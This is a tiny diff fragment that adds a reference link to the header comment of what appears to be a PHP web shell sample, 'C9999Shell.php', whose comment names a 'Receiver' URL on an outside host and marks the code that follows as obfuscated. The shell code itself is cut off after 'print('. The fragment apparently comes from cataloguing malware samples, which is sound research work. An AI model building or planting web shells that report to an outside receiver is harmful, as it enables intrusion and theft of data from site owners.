@@ -2,6 +2,7 @@
 /**
 * Source: C9999Shell.php
 * Receiver: http://data.t00ls.org/where.js
+* Related: http://seclists.org/fulldisclosure/2011/Apr/89
 **/
 //Obfubuscated
 print('
